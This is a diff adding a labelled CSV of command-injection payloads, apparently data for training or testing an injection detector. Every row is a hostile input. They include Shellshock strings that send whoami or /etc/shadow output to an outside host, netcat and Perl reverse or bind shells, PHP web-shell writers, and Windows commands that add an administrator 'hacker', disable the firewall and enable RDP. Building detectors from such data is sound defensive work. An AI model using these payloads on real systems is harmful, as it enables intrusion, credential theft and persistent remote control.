@@ -1,0 +1,890 @@
+﻿Sentence,Label
+&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/passwd&quot;--&gt;,1
+&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/shadow&quot;--&gt;,1
+&lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;,1
+&lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;,1
+/index.html|id|,1
+;id;,1
+;id,1
+;netstat -a;,1
+;system('cat%20/etc/passwd'),1
+;id;,1
+|id,1
+|/usr/bin/id,1
+|id|,1
+|/usr/bin/id|,1
+||/usr/bin/id|,1
+|id;,1
+||/usr/bin/id;,1
+;id|,1
+;|/usr/bin/id|,1
+\n/bin/ls -al\n,1
+\n/usr/bin/id\n,1
+\nid\n,1
+\n/usr/bin/id;,1
+\nid;,1
+\n/usr/bin/id|,1
+\nid|,1
+;/usr/bin/id\n,1
+;id\n,1
+|usr/bin/id\n,1
+|nid\n,1
+`id`,1
+`/usr/bin/id`,1
+a);id,1
+a;id,1
+a);id;,1
+a;id;,1
+a);id|,1
+a;id|,1
+a)|id,1
+a|id,1
+a)|id;,1
+a|id,1
+|/bin/ls -al,1
+a);/usr/bin/id,1
+a;/usr/bin/id,1
+a);/usr/bin/id;,1
+a;/usr/bin/id;,1
+a);/usr/bin/id|,1
+a;/usr/bin/id|,1
+a)|/usr/bin/id,1
+a|/usr/bin/id,1
+a)|/usr/bin/id;,1
+a|/usr/bin/id,1
+;system('cat%20/etc/passwd'),1
+;system('id'),1
+;system('/usr/bin/id'),1
+%0Acat%20/etc/passwd,1
+%0A/usr/bin/id,1
+%0Aid,1
+%0A/usr/bin/id%0A,1
+%0Aid%0A,1
+& ping -i 30 127.0.0.1 &,1
+& ping -n 30 127.0.0.1 &,1
+%0a ping -i 30 127.0.0.1 %0a,1
+`ping 127.0.0.1`,1
+| id,1
+& id,1
+; id,1
+%0a id %0a,1
+`id`,1
+$;/usr/bin/id,1
+"() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=16?user=\`whoami\`""",1
+"() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=18?pwd=\`pwd\`""",1
+"() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=20?shadow=\`grep root /etc/shadow\`""",1
+"() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=22?uname=\`uname -a\`""",1
+"() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=24?shell=\`nc -lvvp 1234 -e /bin/bash\`""",1
+"() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=26?shell=\`nc -lvvp 1236 -e /bin/bash &\`""",1
+"() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=5""",1
+"() { :;}; /bin/bash -c ""sleep 1 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=1&?vuln=6""",1
+"() { :;}; /bin/bash -c ""sleep 1 && echo vulnerable 1""",1
+"() { :;}; /bin/bash -c ""sleep 3 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=3&?vuln=7""",1
+"() { :;}; /bin/bash -c ""sleep 3 && echo vulnerable 3""",1
+"() { :;}; /bin/bash -c ""sleep 6 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=6&?vuln=8""",1
+"() { :;}; /bin/bash -c ""sleep 6 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=9&?vuln=9""",1
+"() { :;}; /bin/bash -c ""sleep 6 && echo vulnerable 6""",1
+"() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=17?user=\`whoami\`""",1
+"() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=19?pwd=\`pwd\`""",1
+"() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=21?shadow=\`grep root /etc/shadow\`""",1
+"() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=23?uname=\`uname -a\`""",1
+"() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=25?shell=\`nc -lvvp 1235 -e /bin/bash\`""",1
+"() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=27?shell=\`nc -lvvp 1237 -e /bin/bash &\`""",1
+"() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=4""",1
+cat /etc/hosts,1
+$(`cat /etc/passwd`),1
+cat /etc/passwd,1
+%0Acat%20/etc/passwd,1
+"{{ get_user_file(""/etc/passwd"") }}",1
+"<!--#exec cmd=""/bin/cat /etc/passwd""-->",1
+"<!--#exec cmd=""/bin/cat /etc/shadow""-->",1
+"<!--#exec cmd=""/usr/bin/id;-->",1
+system('cat /etc/passwd');,1
+"<?php system(""cat /etc/passwd"");?>",1
+`,1
+||,1
+|,1
+;,1
+',1
+"'""",1
+"""",1
+"""'",1
+&,1
+&&,1
+%0a,1
+%0a%0d,1
+%0Aid,1
+%0a id %0a,1
+%0Aid%0A,1
+%0a ping -i 30 127.0.0.1 %0a,1
+%0A/usr/bin/id,1
+%0A/usr/bin/id%0A,1
+"%2 -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #' |ping -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #\"" |ping -n 21 127.0.0.1",1
+%20{${phpinfo()}},1
+%20{${sleep(20)}},1
+%20{${sleep(3)}},1
+a|id|,1
+a;id|,1
+a;id;,1
+a;id\n,1
+() { :;}; curl http://135.23.158.130/.testing/shellshock.txt?vuln=12,1
+| curl http://crowdshield.com/.testing/rce.txt,1
+& curl http://crowdshield.com/.testing/rce.txt,1
+; curl https://crowdshield.com/.testing/rce_vuln.txt,1
+&& curl https://crowdshield.com/.testing/rce_vuln.txt,1
+curl https://crowdshield.com/.testing/rce_vuln.txt,1
+" curl https://crowdshield.com/.testing/rce_vuln.txt ||`curl https://crowdshield.com/.testing/rce_vuln.txt` #' |curl https://crowdshield.com/.testing/rce_vuln.txt||`curl https://crowdshield.com/.testing/rce_vuln.txt` #\"" |curl https://crowdshield.com/.testing/rce_vuln.txt",1
+"curl https://crowdshield.com/.testing/rce_vuln.txt ||`curl https://crowdshield.com/.testing/rce_vuln.txt` #' |curl https://crowdshield.com/.testing/rce_vuln.txt||`curl https://crowdshield.com/.testing/rce_vuln.txt` #\"" |curl https://crowdshield.com/.testing/rce_vuln.txt",1
+$(`curl https://crowdshield.com/.testing/rce_vuln.txt?req=22jjffjbn`),1
+dir,1
+| dir,1
+; dir,1
+$(`dir`),1
+& dir,1
+&&dir,1
+&& dir,1
+| dir C:\,1
+; dir C:\,1
+& dir C:\,1
+&& dir C:\,1
+dir C:\,1
+| dir C:\Documents and Settings\*,1
+; dir C:\Documents and Settings\*,1
+& dir C:\Documents and Settings\*,1
+&& dir C:\Documents and Settings\*,1
+dir C:\Documents and Settings\*,1
+| dir C:\Users,1
+; dir C:\Users,1
+& dir C:\Users,1
+&& dir C:\Users,1
+dir C:\Users,1
+;echo%20'<script>alert(1)</script>',1
+echo '<img src=https://crowdshield.com/.testing/xss.js onload=prompt(2) onerror=alert(3)></img>'// XXXXXXXXXXX,1
+"| echo ""<?php include($_GET['page'])| ?>"" > rfi.php",1
+"; echo ""<?php include($_GET['page']); ?>"" > rfi.php",1
+"& echo ""<?php include($_GET['page']); ?>"" > rfi.php",1
+"&& echo ""<?php include($_GET['page']); ?>"" > rfi.php",1
+"echo ""<?php include($_GET['page']); ?>"" > rfi.php",1
+"| echo ""<?php system('dir $_GET['dir']')| ?>"" > dir.php",1
+"; echo ""<?php system('dir $_GET['dir']'); ?>"" > dir.php",1
+"& echo ""<?php system('dir $_GET['dir']'); ?>"" > dir.php",1
+"&& echo ""<?php system('dir $_GET['dir']'); ?>"" > dir.php",1
+"echo ""<?php system('dir $_GET['dir']'); ?>"" > dir.php",1
+"| echo ""<?php system($_GET['cmd'])| ?>"" > cmd.php",1
+"; echo ""<?php system($_GET['cmd']); ?>"" > cmd.php",1
+"& echo ""<?php system($_GET['cmd']); ?>"" > cmd.php",1
+"&& echo ""<?php system($_GET['cmd']); ?>"" > cmd.php",1
+"echo ""<?php system($_GET['cmd']); ?>"" > cmd.php",1
+;echo '<script>alert(1)</script>',1
+echo '<script>alert(1)</script>'// XXXXXXXXXXX,1
+echo '<script src=https://crowdshield.com/.testing/xss.js></script>'// XXXXXXXXXXX,1
+"| echo ""use Socket;$i=""192.168.16.151"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">;S"");open(STDOUT,"">;S"");open(STDERR,"">;S"");exec(""/bin/sh -i"");};"" > rev.pl",1
+"; echo ""use Socket;$i=""192.168.16.151"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">;S"");open(STDOUT,"">;S"");open(STDERR,"">;S"");exec(""/bin/sh -i"");};"" > rev.pl",1
+"& echo ""use Socket;$i=""192.168.16.151"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");};"" > rev.pl",1
+"&& echo ""use Socket;$i=""192.168.16.151"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");};"" > rev.pl",1
+"echo ""use Socket;$i=""192.168.16.151"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");};"" > rev.pl",1
+() { :;}; echo vulnerable 10,1
+eval('echo XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX'),1
+eval('ls'),1
+eval('pwd'),1
+eval('pwd');,1
+eval('sleep 5'),1
+eval('sleep 5');,1
+eval('whoami'),1
+eval('whoami');,1
+exec('echo XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX'),1
+exec('ls'),1
+exec('pwd'),1
+exec('pwd');,1
+exec('sleep 5'),1
+exec('sleep 5');,1
+exec('whoami'),1
+exec('whoami');,1
+";{$_GET[""cmd""]}",1
+`id`,1
+|id,1
+| id,1
+;id,1
+;id|,1
+;id;,1
+& id,1
+&&id,1
+;id\n,1
+ifconfig,1
+| ifconfig,1
+; ifconfig,1
+& ifconfig,1
+&& ifconfig,1
+/index.html|id|,1
+ipconfig,1
+| ipconfig /all,1
+; ipconfig /all,1
+& ipconfig /all,1
+&& ipconfig /all,1
+ipconfig /all,1
+ls,1
+$(`ls`),1
+| ls -l /,1
+; ls -l /,1
+& ls -l /,1
+&& ls -l /,1
+ls -l /,1
+| ls -laR /etc,1
+; ls -laR /etc,1
+& ls -laR /etc,1
+&& ls -laR /etc,1
+| ls -laR /var/www,1
+; ls -laR /var/www,1
+& ls -laR /var/www,1
+&& ls -laR /var/www,1
+| ls -l /etc/,1
+; ls -l /etc/,1
+& ls -l /etc/,1
+&& ls -l /etc/,1
+ls -l /etc/,1
+ls -lh /etc/,1
+| ls -l /home/*,1
+; ls -l /home/*,1
+& ls -l /home/*,1
+&& ls -l /home/*,1
+ls -l /home/*,1
+*; ls -lhtR /var/www/,1
+| ls -l /tmp,1
+; ls -l /tmp,1
+& ls -l /tmp,1
+&& ls -l /tmp,1
+ls -l /tmp,1
+| ls -l /var/www/*,1
+; ls -l /var/www/*,1
+& ls -l /var/www/*,1
+&& ls -l /var/www/*,1
+ls -l /var/www/*,1
+\n,1
+\n\033[2curl http://135.23.158.130/.testing/term_escape.txt?vuln=1?user=\`whoami\`,1
+\n\033[2wget http://135.23.158.130/.testing/term_escape.txt?vuln=2?user=\`whoami\`,1
+\n/bin/ls -al\n,1
+| nc -lvvp 4444 -e /bin/sh|,1
+; nc -lvvp 4444 -e /bin/sh;,1
+& nc -lvvp 4444 -e /bin/sh&,1
+&& nc -lvvp 4444 -e /bin/sh &,1
+nc -lvvp 4444 -e /bin/sh,1
+nc -lvvp 4445 -e /bin/sh &,1
+nc -lvvp 4446 -e /bin/sh|,1
+nc -lvvp 4447 -e /bin/sh;,1
+nc -lvvp 4448 -e /bin/sh&,1
+\necho INJECTX\nexit\n\033[2Acurl https://crowdshield.com/.testing/rce_vuln.txt\n,1
+\necho INJECTX\nexit\n\033[2Asleep 5\n,1
+\necho INJECTX\nexit\n\033[2Awget https://crowdshield.com/.testing/rce_vuln.txt\n,1
+| net localgroup Administrators hacker /ADD,1
+; net localgroup Administrators hacker /ADD,1
+& net localgroup Administrators hacker /ADD,1
+&& net localgroup Administrators hacker /ADD,1
+net localgroup Administrators hacker /ADD,1
+| netsh firewall set opmode disable,1
+; netsh firewall set opmode disable,1
+& netsh firewall set opmode disable,1
+&& netsh firewall set opmode disable,1
+netsh firewall set opmode disable,1
+netstat,1
+;netstat -a;,1
+| netstat -an,1
+; netstat -an,1
+& netstat -an,1
+&& netstat -an,1
+netstat -an,1
+| net user hacker Password1 /ADD,1
+; net user hacker Password1 /ADD,1
+& net user hacker Password1 /ADD,1
+&& net user hacker Password1 /ADD,1
+net user hacker Password1 /ADD,1
+| net view,1
+; net view,1
+& net view,1
+&& net view,1
+net view,1
+\nid|,1
+\nid;,1
+\nid\n,1
+\n/usr/bin/id\n,1
+"perl -e 'print ""X""x1024'",1
+"|| perl -e 'print ""X""x16096'",1
+"| perl -e 'print ""X""x16096'",1
+"; perl -e 'print ""X""x16096'",1
+"& perl -e 'print ""X""x16096'",1
+"&& perl -e 'print ""X""x16096'",1
+"perl -e 'print ""X""x16384'",1
+"; perl -e 'print ""X""x2048'",1
+"& perl -e 'print ""X""x2048'",1
+"&& perl -e 'print ""X""x2048'",1
+"perl -e 'print ""X""x2048'",1
+"|| perl -e 'print ""X""x4096'",1
+"| perl -e 'print ""X""x4096'",1
+"; perl -e 'print ""X""x4096'",1
+"& perl -e 'print ""X""x4096'",1
+"&& perl -e 'print ""X""x4096'",1
+"perl -e 'print ""X""x4096'",1
+"|| perl -e 'print ""X""x8096'",1
+"| perl -e 'print ""X""x8096'",1
+"; perl -e 'print ""X""x8096'",1
+"&& perl -e 'print ""X""x8096'",1
+"perl -e 'print ""X""x8192'",1
+"perl -e 'print ""X""x81920'",1
+|| phpinfo(),1
+| phpinfo(),1
+ {${phpinfo()}},1
+;phpinfo(),1
+;phpinfo();//,1
+';phpinfo();//,1
+{${phpinfo()}},1
+& phpinfo(),1
+&& phpinfo(),1
+phpinfo(),1
+phpinfo();,1
+"<?php system(""curl https://crowdshield.com/.testing/rce_vuln.txt?method=phpsystem_get"");?>",1
+"<?php system(""curl https://crowdshield.com/.testing/rce_vuln.txt?req=df2fkjj"");?>",1
+"<?php system(""echo XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"");?>",1
+"<?php system(""sleep 10"");?>",1
+"<?php system(""sleep 5"");?>",1
+"<?php system(""wget https://crowdshield.com/.testing/rce_vuln.txt?method=phpsystem_get"");?>",1
+"<?php system(""wget https://crowdshield.com/.testing/rce_vuln.txt?req=jdfj2jc"");?>",1
+:phpversion();,1
+`ping 127.0.0.1`,1
+& ping -i 30 127.0.0.1 &,1
+& ping -n 30 127.0.0.1 &,1
+;${@print(md5(RCEVulnerable))};,1
+"${@print(""RCEVulnerable"")}",1
+${@print(system($_SERVER['HTTP_USER_AGENT']))},1
+pwd,1
+| pwd,1
+; pwd,1
+& pwd,1
+&& pwd,1
+\r,1
+"| reg add ""HKLM\System\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 0 /f",1
+"; reg add ""HKLM\System\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 0 /f",1
+"& reg add ""HKLM\System\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 0 /f",1
+"&& reg add ""HKLM\System\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 0 /f",1
+"reg add ""HKLM\System\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 0 /f",1
+\r\n,1
+route,1
+| sleep 1,1
+; sleep 1,1
+& sleep 1,1
+&& sleep 1,1
+sleep 1,1
+|| sleep 10,1
+| sleep 10,1
+; sleep 10,1
+{${sleep(10)}},1
+& sleep 10,1
+&& sleep 10,1
+sleep 10,1
+|| sleep 15,1
+| sleep 15,1
+; sleep 15,1
+& sleep 15,1
+&& sleep 15,1
+ {${sleep(20)}},1
+{${sleep(20)}},1
+ {${sleep(3)}},1
+{${sleep(3)}},1
+| sleep 5,1
+; sleep 5,1
+& sleep 5,1
+&& sleep 5,1
+sleep 5,1
+ {${sleep(hexdec(dechex(20)))}},1
+{${sleep(hexdec(dechex(20)))}},1
+sysinfo,1
+| sysinfo,1
+; sysinfo,1
+& sysinfo,1
+&& sysinfo,1
+system('cat C:\boot.ini');,1
+system('cat config.php');,1
+|| system('curl https://crowdshield.com/.testing/rce_vuln.txt');,1
+| system('curl https://crowdshield.com/.testing/rce_vuln.txt');,1
+; system('curl https://crowdshield.com/.testing/rce_vuln.txt');,1
+& system('curl https://crowdshield.com/.testing/rce_vuln.txt');,1
+&& system('curl https://crowdshield.com/.testing/rce_vuln.txt');,1
+system('curl https://crowdshield.com/.testing/rce_vuln.txt'),1
+system('curl https://crowdshield.com/.testing/rce_vuln.txt?req=22fd2wdf'),1
+system('curl https://xerosecurity.com/.testing/rce_vuln.txt');,1
+system('echo XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX'),1
+systeminfo,1
+| systeminfo,1
+; systeminfo,1
